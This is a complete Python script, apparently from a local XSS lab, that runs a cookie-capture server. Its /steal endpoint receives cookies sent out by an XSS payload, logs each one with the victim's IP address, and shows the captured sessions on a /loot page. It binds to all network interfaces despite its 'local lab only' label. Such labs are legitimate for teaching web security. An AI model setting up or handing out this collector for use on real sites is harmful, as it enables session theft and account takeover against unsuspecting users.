#!/usr/bin/env python3
"""
EVIL SERVER — LOCAL LAB USE ONLY
Listens for the exfiltrated cookie sent by the XSS payload and logs it.
Run with: python3 evil_server.py
Then browse to http://127.0.0.1:9000/loot to see everything captured.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime

PORT = 9000
LOOT_FILE = "stolen_cookies.txt"


class EvilHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        # Quieter default logging; we print our own formatted lines below.
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if parsed.path == "/steal":
            cookie = params.get("c", params.get("cookie", ["(none)"]))[0]
            victim_ip = self.client_address[0]
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            line = f"[{timestamp}] From {victim_ip} -> {cookie}"
            print("\n*** CAPTURED ***")
            print(line)

            with open(LOOT_FILE, "a") as f:
                f.write(line + "\n")

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")  # victim's browser just sees a blank 'ok'

        elif parsed.path == "/loot":
            try:
                with open(LOOT_FILE) as f:
                    contents = f.read()
            except FileNotFoundError:
                contents = "(nothing captured yet)"

            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            html = f"""
            <html><body style="font-family:monospace; background:#111; color:#0f0; padding:20px;">
            <h2>Captured sessions</h2>
            <pre>{contents}</pre>
            </body></html>
            """
            self.wfile.write(html.encode())

        else:
            self.send_response(404)
            self.end_headers()


if __name__ == "__main__":
    print(f"Evil listener running on http://0.0.0.0:{PORT}")
    print(f"  Exfil endpoint: http://127.0.0.1:{PORT}/steal?c=<cookie>")
    print(f"  Loot viewer:    http://127.0.0.1:{PORT}/loot")
    HTTPServer(("0.0.0.0", PORT), EvilHandler).serve_forever()
